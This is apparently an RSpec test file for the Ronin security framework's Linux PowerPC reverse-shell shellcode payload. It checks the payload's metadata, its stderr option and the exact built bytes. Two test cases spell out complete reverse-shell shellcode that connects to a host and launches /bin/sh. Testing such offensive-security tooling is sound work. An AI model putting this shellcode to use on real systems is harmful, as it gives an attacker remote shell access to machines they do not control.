require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/linux/ppc/reverse_shell'

describe Ronin::Payloads::Shellcode::Linux::PPC::ReverseShell do
  it "must inherit from Ronin::Payloads::Shellcode::ReverseShellPayload" do
    expect(described_class).to be < Ronin::Payloads::Shellcode::ReverseShellPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/linux/ppc/reverse_shell'" do
      expect(subject.id).to eq('shellcode/linux/ppc/reverse_shell')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :ppc" do
      expect(subject.arch).to be(:ppc)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :linux" do
      expect(subject.os).to be(:linux)
    end
  end

  describe "params" do
    subject { described_class }

    it "must define a with_stderr param that defualts to true" do
      expect(subject.params[:with_stderr]).to_not be(nil)
      expect(subject.params[:with_stderr].type).to be_kind_of(Ronin::Core::Params::Types::Boolean)
      expect(subject.params[:with_stderr].desc).to eq('Enables/disables stderr')
      expect(subject.params[:with_stderr].default).to be(true)
    end
  end

  let(:host) { '127.0.0.1' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x7c\x3f\x0b\x78\x3b\x40\x01\x0e\x3b\x5a\xfe\xf4\x7f\x43\xd3\x78\x3b\x60\x01\x0d\x3b\x7b\xfe\xf4\x7f\x64\xdb\x78\x7c\xa5\x2a\x78\x7c\x3c\x0b\x78\x3b\x9c\x01\x0c\x90\x7c\xff\x08\x90\x9c\xff\x0c\x90\xbc\xff\x10\x7f\x63\xdb\x78\x3b\xdf\x01\x0c\x38\x9e\xff\x08\x3b\x20\x01\x98\x7f\x20\x16\x70\x44\xde\xad\xf2\x7c\x78\x1b\x78\xb3\x5e\xff\x16\x7f\xbd\xea\x78\x63\xbd\x05\x39\xb3\xbe\xff\x18\x3f\xa0\x7f\x00\x63\xbd\x00\x01\x93\xbe\xff\x1a\x93\x1c\xff\x08\x3a\xde\xff\x16\x92\xdc\xff\x0c\x3b\xa0\x01\x1c\x38\xbd\xfe\xf4\x90\xbc\xff\x10\x7f\x20\x16\x70\x7c\x7a\xda\x14\x38\x9c\xff\x08\x44\xde\xad\xf2\x7f\x03\xc3\x78\x7c\x84\x22\x78\x3a\xe0\x01\xf8\x7e\xe0\x1e\x70\x44\xde\xad\xf2\x7f\x03\xc3\x78\x7f\x64\xdb\x78\x7e\xe0\x1e\x70\x44\xde\xad\xf2\x7f\x03\xc3\x78\x7f\x44\xd3\x78\x7e\xe0\x1e\x70\x44\xde\xad\xf2\x7c\xa5\x2a\x79\x42\x40\xff\x35\x7f\x08\x02\xa6\x3b\x18\x01\x34\x98\xb8\xfe\xfb\x38\x78\xfe\xf4\x90\x61\xff\xf8\x38\x81\xff\xf8\x90\xa1\xff\xfc\x3b\xc0\x01\x60\x7f\xc0\x2e\x70\x44\xde\xad\xf2/bin/shZ".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end

    context "when the with_stderr param is set to false" do
      subject do
        described_class.new(
          params: {
            host: host,
            port: port,
            with_stderr: false
          }
        )
      end

      it "must omit the four instructions which enable piping stderr" do
        expect(subject.payload).to eq(
          "\x7c\x3f\x0b\x78\x3b\x40\x01\x0e\x3b\x5a\xfe\xf4\x7f\x43\xd3\x78\x3b\x60\x01\x0d\x3b\x7b\xfe\xf4\x7f\x64\xdb\x78\x7c\xa5\x2a\x78\x7c\x3c\x0b\x78\x3b\x9c\x01\x0c\x90\x7c\xff\x08\x90\x9c\xff\x0c\x90\xbc\xff\x10\x7f\x63\xdb\x78\x3b\xdf\x01\x0c\x38\x9e\xff\x08\x3b\x20\x01\x98\x7f\x20\x16\x70\x44\xde\xad\xf2\x7c\x78\x1b\x78\xb3\x5e\xff\x16\x7f\xbd\xea\x78\x63\xbd\x05\x39\xb3\xbe\xff\x18\x3f\xa0\x7f\x00\x63\xbd\x00\x01\x93\xbe\xff\x1a\x93\x1c\xff\x08\x3a\xde\xff\x16\x92\xdc\xff\x0c\x3b\xa0\x01\x1c\x38\xbd\xfe\xf4\x90\xbc\xff\x10\x7f\x20\x16\x70\x7c\x7a\xda\x14\x38\x9c\xff\x08\x44\xde\xad\xf2\x7f\x03\xc3\x78\x7c\x84\x22\x78\x3a\xe0\x01\xf8\x7e\xe0\x1e\x70\x44\xde\xad\xf2\x7f\x03\xc3\x78\x7f\x64\xdb\x78\x7e\xe0\x1e\x70\x44\xde\xad\xf2\x7c\xa5\x2a\x79\x42\x40\xff\x35\x7f\x08\x02\xa6\x3b\x18\x01\x34\x98\xb8\xfe\xfb\x38\x78\xfe\xf4\x90\x61\xff\xf8\x38\x81\xff\xf8\x90\xa1\xff\xfc\x3b\xc0\x01\x60\x7f\xc0\x2e\x70\x44\xde\xad\xf2/bin/shZ".b
        )
      end
    end
  end
end